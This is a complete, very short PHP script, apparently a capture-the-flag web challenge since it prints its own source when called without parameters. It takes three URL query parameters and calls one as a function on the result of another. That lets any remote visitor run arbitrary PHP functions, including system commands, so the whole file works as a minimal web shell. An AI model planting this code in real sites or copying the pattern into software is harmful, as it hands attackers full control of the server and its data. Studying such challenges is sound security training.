<?php

if (isset($_GET[0]) && isset($_GET[1]) && isset($_GET[2])) {
    ($_GET[0])($_GET[1]($_GET[2]));
} else {
    highlight_file(__FILE__);
}

?>
